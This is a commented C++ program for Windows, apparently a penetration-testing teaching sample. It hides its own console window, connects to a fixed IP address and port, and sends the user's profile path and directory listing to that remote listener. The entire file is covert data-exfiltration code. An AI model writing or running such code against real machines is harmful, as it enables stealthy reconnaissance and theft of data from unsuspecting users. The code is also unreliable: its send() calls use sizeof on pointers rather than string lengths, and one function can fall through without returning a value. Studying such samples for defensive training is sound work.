#define _WINSOCK_DEPRECATED_NO_WARNINGS 		/* we use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs. */
#pragma comment(lib, "Ws2_32.lib") 			/* we need the Ws2_32.lib library in order to use sockets (networking) */

/* now comes headers which provide various utilities for our program: */

#include <iostream> 					 //standard input/output utilities
#include <winsock2.h>					 //networking utilities
#include <stdio.h> 					 //standard input/output utilities

#include <stdlib.h> 					//standard input/output utilities
#include <dirent.h> 					//directory utilities
#include <string> 					//string utilities

char* userDirectory()  /* char* before a functions' name means it will return a pointer to a string */
{
    char* pPath;
    pPath = getenv ("USERPROFILE");
    if (pPath!=NULL)
    {
        return pPath;
    } else {
        perror("");
    }
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);			// do not show (hide) this program window
    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);			/* initialize usage of the winsock library (needed for opening a network connection) */
    server = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_addr.s_addr = inet_addr("192.168.0.29");		 //set up a TCP socket
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);
    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    char* pPath = userDirectory(); 				/* the path is sent to the penetration tester on the previously set ip address and port */
    send(server, pPath, sizeof(pPath), 0);

    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir (pPath)) != NULL) {			/* if opening directory at retrieved path brings any results */
        while ((ent = readdir (dir)) != NULL) {
        send(server, ent->d_name, sizeof(ent->d_name), 0);
        }
        closedir (dir);
    } else {
        perror ("");
    }
    closesocket(server);
    WSACleanup();						//clean up the Winsock library components
}